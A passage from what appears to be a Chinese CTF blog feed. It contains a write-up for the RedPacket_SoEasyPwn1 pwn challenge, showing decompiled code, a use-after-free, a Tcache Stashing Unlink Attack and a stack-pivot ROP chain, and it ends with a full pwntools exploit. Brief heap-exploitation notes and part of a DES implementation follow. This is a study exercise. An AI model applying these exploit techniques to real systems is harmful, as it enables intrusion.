  int v4; // [rsp+10Ch] [rbp-4h]

  v4 = 0;
  sub_11D5();
  sub_1450();
  sub_1269();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        v4 = readd();
        if ( v4 != 3 )
          break;
        a1 = v3;
        edit(v3, a2);
      }
      if ( v4 &gt; 3 )
        break;
      if ( v4 == 1 )
      {
        if ( x1c &lt;= 0 )
          exitt();
        a1 = v3;
        add(v3);
        --x1c;
      }
      else
      {
        if ( v4 != 2 )
          goto LABEL_19;
        a1 = v3;
        delete(v3);
      }
    }
    if ( v4 == 5 )
      exitt();
    if ( v4 &lt; 5 )
    {
      a1 = v3;
      show(v3);
    }
    else
    {
      if ( v4 != 666 )
LABEL_19:
        exitt();
      stack_attack(a1, a2);
    }
  }
}
</code></pre>
<h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>申请chunk，会指定chunk的序号，最大为16，且只能申请四种chunk，1.0x10 2.0xf0 3.0x300 4.0x400，并且是calloc函数分配堆块，chunk不会从tcache bin中取。</p>
<pre><code>int __fastcall sub_1515(__int64 a1)
{
  int v2; // [rsp+10h] [rbp-20h]
  int v3; // [rsp+14h] [rbp-1Ch]
  unsigned int v4; // [rsp+18h] [rbp-18h]
  int size; // [rsp+1Ch] [rbp-14h]

  printf("Please input the red packet idx: ");
  v4 = readd();
  if ( v4 &gt; 0x10 )
    exitt();
  printf("How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ");
  v3 = readd();
  if ( v3 == 2 )
  {
    size = 0xF0;
  }
  else if ( v3 &gt; 2 )
  {
    if ( v3 == 3 )
    {
      size = 0x300;
    }
    else
    {
      if ( v3 != 4 )
        goto LABEL_14;
      size = 0x400;
    }
  }
  else
  {
    if ( v3 != 1 )
    {
LABEL_14:
      size = 0;
      goto LABEL_15;
    }
    size = 16;
  }
LABEL_15:
  if ( size != 0x10 &amp;&amp; size != 0xF0 &amp;&amp; size != 0x300 &amp;&amp; size != 0x400 )
    exitt();
  *(16LL * v4 + a1) = calloc(1uLL, size);
  *(a1 + 16LL * v4 + 8) = size;
  printf("Please input content: ");
  v2 = read(0, *(16LL * v4 + a1), *(16LL * v4 + a1 + 8));
  if ( v2 &lt;= 0 )
    exitt();
  *(v2 - 1LL + *(16LL * v4 + a1)) = 0;
  return puts("Done!");
}
</code></pre>
<h2 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h2><p>存在UAF</p>
<pre><code>int __fastcall delete(__int64 a1)
{
  unsigned int v2; // [rsp+1Ch] [rbp-4h]

  printf("Please input the red packet idx: ");
  v2 = readd();
  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )
    exitt();
  free(*(16LL * v2 + a1));                      // uaf
                                                // 
  return puts("Done!");
}
</code></pre>
<h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>编辑的次数受qword_4010控制，qword_4010为1，只能编辑1次</p>
<pre><code>int __fastcall sub_1740(__int64 a1, __int64 a2)
{
  void *v2; // rsi
  int v4; // [rsp+18h] [rbp-8h]
  unsigned int v5; // [rsp+1Ch] [rbp-4h]

  if ( qword_4010 &lt;= 0 )
    exitt(a1, a2);
  --qword_4010;
  printf("Please input the red packet idx: ");
  v5 = readd();
  if ( v5 &gt; 0x10 || !*(16LL * v5 + a1) )
    exitt("Please input the red packet idx: ", a2);
  printf("Please input content: ");
  v2 = *(16LL * v5 + a1);
  v4 = read(0, v2, *(16LL * v5 + a1 + 8));
  if ( v4 &lt;= 0 )
    exitt(0LL, v2);
  *(v4 - 1LL + *(16LL * v5 + a1)) = 0;
  return puts("Done!");
}
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><pre><code>int __fastcall sub_184E(__int64 a1)
{
  unsigned int v2; // [rsp+1Ch] [rbp-4h]

  printf("Please input the red packet idx: ");
  v2 = readd();
  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )
    exitt();
  puts(*(16LL * v2 + a1));
  return puts("Done!");
}
</code></pre>
<h2 id="栈溢出函数"><a href="#栈溢出函数" class="headerlink" title="栈溢出函数"></a>栈溢出函数</h2><p>执行栈溢出函数需要满足*(first_chunk + 2048)&gt; 0x7F0000000000且*(first_chunk + 2040) 和 *(first_chunk + 2056)值为0。first_chunk就是我们申请的第一个chunk。</p>
<pre><code>ssize_t sub_13BD()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  if ( *(first_chunk + 2048) &lt;= 0x7F0000000000LL || *(first_chunk + 2040) || *(first_chunk + 2056) )
    exitt();
  puts("You get red packet!");
  printf("What do you want to say?");
  return read(0, buf, 0x90uLL);
}
</code></pre>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为存在一个栈溢出的漏洞，我们可以使用堆ROP，而要想利用栈溢出漏洞需要将*(first_chunk + 2048)修改为一个大于0x7F0000000000的值，而*(first_chunk + 2040)和 *(first_chunk + 2056)本来就是0，保持不变即可。calloc函数分配堆块，chunk不会从tcache bin中取。程序至少可以分配两种不同大小且大小为unsorted bin的Chunk（0x300和0x400）。这里我们可以使用Tcache Stashing Unlink Attack。</p>
<h1 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h1><p>先把前面的写好</p>
<pre><code># coding=utf-8
from pwn import *
context(endian='little',os='linux',arch='amd64',log_level='debug') 

sh = process('./RedPacket_SoEasyPwn1')
#sh = remote('node4.buuoj.cn','27283')

libc=ELF("./libc-2.29.so")

 
 

s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims		    :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
def dbg():
        gdb.attach(sh)
        pause()
 

def add(index,chunk_size_index,value):
    ru('Your input: ')
    sl('1')
    ru('Please input the red packet idx: ')
    sl(str(index))
    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
    sl(str(chunk_size_index))
    ru('Please input content: ')
    sl(value)

def free(index):
    ru('Your input: ')
    sl('2')
    ru('Please input the red packet idx: ')
    sl(str(index))

def edit(index,value):
    ru('Your input: ')
    sl('3')
    ru('Please input the red packet idx: ')
    sl(str(index))
    ru('Please input content: ')
    sl(value)

def show(index):
    ru('Your input: ')
    sl('4')
    ru('Please input the red packet idx: ')
    sl(str(index))
</code></pre>
<h2 id="构造tcache-bin"><a href="#构造tcache-bin" class="headerlink" title="构造tcache bin"></a>构造tcache bin</h2><p>首先我们要获得unsorted bin的chunk，需要先填满0x400大小的tcache bin，填0x300大小的tcache bin只剩1个</p>
<pre><code>#1.0x10 2.0xf0 3.0x300 4.0x400
for i in range(7):
    add(15,4,'Chunk_15')
    free(15)

for i in range(6):
    add(14,2,'Chunk_14')
    free(14)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>此时我们利用UAF可以泄露出heap地址</p>
<pre><code>show(15)
last_chunk_addr = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00'))
lg('last_chunk_addr',last_chunk_addr)
heap_addr = last_chunk_addr - 0x26C0
lg('heap_addr',heap_addr)
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<h2 id="利用unsorted-bin构造两个small-bin-chunk"><a href="#利用unsorted-bin构造两个small-bin-chunk" class="headerlink" title="利用unsorted bin构造两个small bin chunk"></a>利用unsorted bin构造两个small bin chunk</h2><blockquote>
<p>当我们申请一个chunk时，如果unsorted bin里有chunk，而我们所申请的chunk大小小于unsorted bin里的chunk，那么就把unsorted bin的chunk分割，拿出我们需要的大小申请chunk，剩下的继续留在unsorted bin中，<br>而如果我们申请的chunk大小大于unsorted bin中的chunk，那么就会把unsorted bin中的chunk，按照大小放入对应的bin中，之后再从top chunk中申请一个chunk。</p>
</blockquote>
<p>我们可以先申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），之后free 大小为0x400的chunk，再申请两次0x300大小的chunk，第一次申请的chunk会从0x400大小的chunk里切割出0x300，unsorted bin还剩0x100大小的chunk，第二次申请的chunk由于大于unsorted bin中的chunk，会将unsorted bin中的0x100大小的chunk放进small bin，我们利用同样的方法可以再次得到一个small bin的chunk，这样我们就得到了两个small bin chunk。</p>
<p>申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），可以看到tcachebin中的chunk没有被拿走。</p>
<pre><code>add(1,4,'Chunk_1')
add(13,3,'Chunk_13')

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>我们free chunk1，因为chunk1大小为0x400，tcachebin中0x400大小的chunk已满了7个，所以进入unsorted bin，利用UAF泄露libc基地址</p>
<pre><code>free(1)
show(1)
libc_base = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00')) - 0x1E4CA0
lg('libc_base',libc_base)
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>申请0x300大小的chunk，在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100</p>
<pre><code>add(13,3,'Chunk_13')
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<p>在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk，成功制造一个small bin chunk</p>
<pre><code>add(13,3,'Chunk_13')

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>利用同样方法再构造一个small bin chunk</p>
<pre><code>add(2,4,'Chunk_2')
add(13,4,'Chunk_13')

#dbg()

free(2)

#dbg()

add(13,3,'Chunk_13')
add(13,3,'Chunk_13')

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<p>并借此我们找到size大小为0x1010的就是first_chunk，借此我们算出刚刚泄露出的heap+ 0x250+0x10+0x800-0x10就是first_chunk+0x800的地址，small bin chunk2的fd指针指向small bin chunk1不变，所以我们还要算出small bin chunk1距离heap的距离0x37e0</p>
<h2 id="修改small-bin-chunk的bk指针为first-chunk-0x800"><a href="#修改small-bin-chunk的bk指针为first-chunk-0x800" class="headerlink" title="修改small bin chunk的bk指针为first_chunk+0x800"></a>修改small bin chunk的bk指针为first_chunk+0x800</h2><pre><code>payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
edit(2,payload)
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>再次申请0x100大小的chunk，程序仅会检查Chunk2的fd指针是否指向Chunk1，在取出Chunk1后，因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中，我们若此时篡改Chunk2的bk指针指向first_chunk+0x800，触发Tcache Stashing Unlink Attack将main_arena+336写入first_chunk+0x800，满足first_chunk+0x800大于0x7F0000000000.</p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<h2 id="构造ORW的ROP链放入堆块中"><a href="#构造ORW的ROP链放入堆块中" class="headerlink" title="构造ORW的ROP链放入堆块中"></a>构造ORW的ROP链放入堆块中</h2><p>先获取一些gadget段， file_name_addr是我们要申请的下一个chunk的mem地址，也就是当前的top chunk的mem地址，距离heap 0x0000000000004A40</p>
<pre><code>pop_rdi_ret = libc_base + 0x0000000000026542
pop_rsi_ret = libc_base + 0x0000000000026f9e
pop_rdx_ret = libc_base + 0x000000000012bda6
file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置
flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容
ROP_chain  = '/flag\x00\x00\x00'
</code></pre>
<p>open(file_name_addr,0)</p>
<pre><code>ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(file_name_addr)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(0)
ROP_chain += p64(libc_base+libc.symbols['open'])
</code></pre>
<p>read(3,flag_addr,0x40)<br>Read函数的第一个参数文件描述符从0开始累加，<br>程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，<br>这样在程序中，每打开一个文件，文件描述符值从3开始累加。<br>我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件<br>read函数第一个参数是3，就是在这个文件里读取数据。</p>
<pre><code>ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(3)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(flag_addr)
ROP_chain += p64(pop_rdx_ret)
ROP_chain += p64(0x40)
ROP_chain += p64(libc_base+libc.symbols['read'])
</code></pre>
<p>write(1,flag_addr,0x40)</p>
<pre><code>ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(1)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(flag_addr)
ROP_chain += p64(pop_rdx_ret)
ROP_chain += p64(0x40)
ROP_chain += p64(libc_base+libc.symbols['write'])
</code></pre>
<p>申请chunk，将ROP链写到chunk里</p>
<pre><code>add(4,4,ROP_chain)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>利用read(0, buf, 0x90uLL);buf0x80字节，正好可以溢出0x10字节，进行栈迁移，将程序迁移到我们最新申请的chunk处执行我们的ROP链。<br class='item-img' data-src='https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<pre><code>leave_ret = libc_base + 0x0000000000058373
ru('Your input: ')
sl('666')
ru('What do you want to say?')
#栈迁移
sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))

itr()
</code></pre>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code># coding=utf-8
from pwn import *
context(endian='little',os='linux',arch='amd64',log_level='debug') 

sh = process('./RedPacket_SoEasyPwn1')
#sh = remote('node4.buuoj.cn','27283')

libc=ELF("./libc-2.29.so")

 
 

s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims		    :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
def dbg():
        gdb.attach(sh)
        pause()
 

def add(index,chunk_size_index,value):
    ru('Your input: ')
    sl('1')
    ru('Please input the red packet idx: ')
    sl(str(index))
    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
    sl(str(chunk_size_index))
    ru('Please input content: ')
    sl(value)

def free(index):
    ru('Your input: ')
    sl('2')
    ru('Please input the red packet idx: ')
    sl(str(index))

def edit(index,value):
    ru('Your input: ')
    sl('3')
    ru('Please input the red packet idx: ')
    sl(str(index))
    ru('Please input content: ')
    sl(value)

def show(index):
    ru('Your input: ')
    sl('4')
    ru('Please input the red packet idx: ')
    sl(str(index))


 

#1.0x10 2.0xf0 3.0x300 4.0x400
for i in range(7):
    add(15,4,'Chunk_15')
    free(15)



for i in range(6):
    add(14,2,'Chunk_14')
    free(14)

#dbg()

show(15)
last_chunk_addr = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00'))
lg('last_chunk_addr',last_chunk_addr)
heap_addr = last_chunk_addr - 0x26C0
lg('heap_addr',heap_addr)

#dbg()

add(1,4,'Chunk_1')
add(13,3,'Chunk_13')

#dbg()

free(1)
show(1)
libc_base = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00')) - 0x1E4CA0
lg('libc_base',libc_base)


#dbg()

#在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100
add(13,3,'Chunk_13')


#dbg()

#在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk
add(13,3,'Chunk_13')

#dbg()

#在申请一个0x400大小的chunk，再制造一个0x100的smallbin的chunk
add(2,4,'Chunk_2')
#申请一个chunk防止合并
add(13,4,'Chunk_13')

#dbg()

free(2)

#dbg()

add(13,3,'Chunk_13')
add(13,3,'Chunk_13')

#dbg()

payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
edit(2,payload)

#dbg()

add(3,2,'Chunk_3')
lg('heap_addr',heap_addr)

#dbg()

#ORW
pop_rdi_ret = libc_base + 0x0000000000026542
pop_rsi_ret = libc_base + 0x0000000000026f9e
pop_rdx_ret = libc_base + 0x000000000012bda6
file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置
flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容
ROP_chain  = '/flag\x00\x00\x00'
#open(file_name_addr,0)
ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(file_name_addr)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(0)
ROP_chain += p64(libc_base+libc.symbols['open'])
#read(3,flag_addr,0x40)
#Read函数的第一个参数文件描述符从0开始累加，
#程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，
#这样在程序中，每打开一个文件，文件描述符值从3开始累加。
#我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件
#read函数第一个参数是3，就是在这个文件里读取数据。
ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(3)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(flag_addr)
ROP_chain += p64(pop_rdx_ret)
ROP_chain += p64(0x40)
ROP_chain += p64(libc_base+libc.symbols['read'])
#write(1,flag_addr,0x40)
ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(1)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(flag_addr)
ROP_chain += p64(pop_rdx_ret)
ROP_chain += p64(0x40)
ROP_chain += p64(libc_base+libc.symbols['write'])

add(4,4,ROP_chain)

#dbg()

leave_ret = libc_base + 0x0000000000058373
ru('Your input: ')
sl('666')
ru('What do you want to say?')
#栈迁移
sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))

#dbg()
itr()
</code></pre>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/09/11/double%20free/</url>
    <content><![CDATA[<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote>
<p>1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空<br>2.fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p>
</blockquote>
<p>该漏洞是指将同一个chunk free两次，通常情况下free两个chunk会报错是无法编译的，监测机制也很简单，就仅仅是对free变量与前一个进行对比，所以可以中间夹一个其他的实现：</p>
<pre><code>free(shangu1)
free(shangu2)
free(shangu1)
</code></pre>
<p>此时的 bins 中情况大概如下：0x20 —&gt; shangu1 —&gt; shangu2 —&gt; shangu1<br>当再次申请堆时会出现 有两个指针指向同一个chunk</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/09/11/fastbin%20attack/</url>
    <content><![CDATA[<p>如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：</p>
<pre><code>检测1：检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例如：一个fastbin链所存储的
chunk大小必须在0x30-0x40之间，但是你要申请的这个chunk却是0x50,那么就会程序就报错退出)

检测2：检测你这个freechunk的size成员的PREV INUSE为是否为1，为1才可以通过检测
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>密码学实验</title>
    <url>/2023/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><pre><code class="C++">#include &lt;bits/stdc++.h&gt;
using namespace std;
string string_to_hex(const string&amp; str) //字符串转化为十六进制
{
    string result="";
    string tmp;
    stringstream ss;
    for(int i=0;i&lt;str.size();i++)
    {
        ss&lt;&lt;hex&lt;&lt;int(str[i])&lt;&lt;endl;
        ss&gt;&gt;tmp;
        result+=tmp;
    }
    return result;
}
string hex_to_string(const std::string&amp; str)
{
    std::string result;
    for (size_t i = 0; i &lt; str.length(); i += 2)//十六进制两个字符为原始字符一个字符
    {
        std::string byte = str.substr(i, 2);//每次切两个字符
        //将十六进制的string转成long再强转成int再转成char
        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);
        result.push_back(chr);//将处理完的字符压入result中
    }
    return result;
}

string hex2bin(string s)
{
    //十六进制转化为二进制
    unordered_map&lt;char, string&gt; mp;
    mp['0'] = "0000";
    mp['1'] = "0001";
    mp['2'] = "0010";
    mp['3'] = "0011";
    mp['4'] = "0100";
    mp['5'] = "0101";
    mp['6'] = "0110";
    mp['7'] = "0111";
    mp['8'] = "1000";
    mp['9'] = "1001";
    mp['A'] = "1010";
    mp['B'] = "1011";
    mp['C'] = "1100";
    mp['D'] = "1101";
    mp['E'] = "1110";
    mp['F'] = "1111";
    string bin = "";
    for (int i = 0; i &lt; s.size(); i++) {
        bin += mp[s[i]];
    }
    return bin;
}
string bin2hex(string s)
{
    // 二进制转化为16进制
    unordered_map&lt;string, string&gt; mp;
    mp["0000"] = "0";
    mp["0001"] = "1";
    mp["0010"] = "2";
    mp["0011"] = "3";
    mp["0100"] = "4";
    mp["0101"] = "5";
    mp["0110"] = "6";
    mp["0111"] = "7";
    mp["1000"] = "8";
    mp["1001"] = "9";
    mp["1010"] = "A";
    mp["1011"] = "B";
    mp["1100"] = "C";
    mp["1101"] = "D";
    mp["1110"] = "E";
    mp["1111"] = "F";
    string hex = "";
    for (int i = 0; i &lt; s.length(); i += 4) {
        string ch = "";
        ch += s[i];
        ch += s[i + 1];
        ch += s[i + 2];
        ch += s[i + 3];
        hex += mp[ch];
    }
    return hex;
}

string permute(string k, int* arr, int n)
{
    string per = "";
    for (int i = 0; i &lt; n; i++) {
        per += k[arr[i] - 1];
    }
    return per;
}

string shift_left(string k, int shifts)
{
    string s = "";
    for (int i = 0; i &lt; shifts; i++) {
        for (int j = 1; j &lt; 28; j++) {
            s += k[j];
        }
        s += k[0];
        k = s;
        s = "";
    }
    return k;
}

string xor_(string a, string b)
{
    string ans = "";
    for (int i = 0; i &lt; a.size(); i++) {
        if (a[i] == b[i]) {
            ans += "0";
        }
        else {
            ans += "1";
        }
    }
    return ans;
}
string encrypt(string pt, vector&lt;string&gt; rkb,
               vector&lt;string&gt; rk)
{
    // 16-&gt;2
    pt = hex2bin(pt);

    // 初始置换
    int initial_perm[64]
            = { 58, 50, 42, 34, 26, 18, 10, 2,  60, 52, 44,
                36, 28, 20, 12, 4,  62, 54, 46, 38, 30, 22,
                14, 6,  64, 56, 48, 40, 32, 24, 16, 8,  57,
                49, 41, 33, 25, 17, 9,  1,  59, 51, 43, 35,
                27, 19, 11, 3,  61, 53, 45, 37, 29, 21, 13,
                5,  63, 55, 47, 39, 31, 23, 15, 7 };
    // 初始置换
    pt = permute(pt, initial_perm, 64);
    cout &lt;&lt; "初始置换后: " &lt;&lt; bin2hex(pt)
         &lt;&lt; endl;

    // 拆分成左右32比特
    string left = pt.substr(0, 32);
    string right = pt.substr(32, 32);
    cout &lt;&lt; "拆分后: L0=" &lt;&lt; bin2hex(left)
         &lt;&lt; " R0=" &lt;&lt; bin2hex(right) &lt;&lt; endl;

    // E盒扩展
    int exp_d[48]
            = { 32, 1,  2,  3,  4,  5,  4,  5,  6,  7,  8,  9,
                8,  9,  10, 11, 12, 13, 12, 13, 14, 15, 16, 17,
                16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,
                24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1 };

    // S盒
    int s[8][4][16] = {
            { 14, 4,  13, 1, 2,  15, 11, 8,  3,  10, 6,  12, 5,9,  0,  7,  0, 15, 7,  4,  14, 2,  13, 1,  10, 6,12, 11, 9,  5, 3,  8,  4,  1,  14, 8,  13, 6,  2, 11, 15, 12, 9, 7,  3,  10, 5,  0,  15, 12, 8,  2, 4,  9,  1,  7, 5,  11, 3,  14, 10, 0,  6,  13 },
            { 15, 1,  8,  14, 6,  11, 3, 4,  9,  7,  2,  13, 12, 0,  5,  10, 3,  13, 4,  7, 15, 2,  8,  14, 12, 0, 1,  10, 6,  9,  11, 5,  0, 14, 7,  11, 10, 4,  13, 1,  5,  8,  12, 6,  9,  3, 2,  15, 13, 8,  10, 1, 3,  15, 4,  2,  11, 6,  7, 12, 0,  5,  14, 9 },
            { 10, 0,  9,  14, 6,  3,  15, 5,  1,  13, 12, 7,  11, 4,  2,  8,  13, 7,  0,  9,  3,  4, 6,  10, 2,  8,  5,  14, 12, 11, 15, 1,  13, 6,  4,  9,  8,  15, 3,  0,  11, 1,  2,  12, 5,  10, 14, 7,  1,  10, 13, 0,  6,  9,  8, 7,  4,  15, 14, 3,  11, 5,  2,  12 },
            { 7,  13, 14, 3,  0,  6,  9,  10, 1,  2, 8,  5,  11, 12, 4,  15, 13, 8,  11, 5,  6,  15, 0, 3,  4,  7, 2,  12, 1,  10, 14, 9,  10, 6,  9,  0, 12, 11, 7, 13, 15, 1,  3,  14, 5,  2,  8,  4,  3, 15, 0,  6, 10, 1,  13, 8,  9,  4,  5,  11, 12, 7, 2,  14 },
            { 2,  12, 4, 1,  7,  10, 11, 6, 8,  5,  3,  15, 13, 0,  14, 9, 14, 11, 2,  12, 4, 7,  13, 1,  5,  0, 15, 10, 3, 9,  8,  6,  4,  2, 1,  11, 10, 13, 7, 8,  15, 9, 12, 5,  6,  3,  0, 14, 11, 8,  12, 7, 1,  14, 2, 13, 6,  15, 0,  9, 10, 4,  5,  3 },
            { 12, 1,  10, 15, 9,  2,  6,  8,  0,  13, 3, 4, 14, 7,  5,  11, 10, 15, 4,  2,  7,  12, 9,  5, 6, 1, 13, 14, 0,  11, 3,  8,  9,  14, 15, 5,  2, 8, 12, 3,  7,  0,  4,  10, 1,  13, 11, 6,  4,  3, 2, 12, 9,  5,  15, 10, 11, 14, 1,  7,  6,  0,  8, 13 },
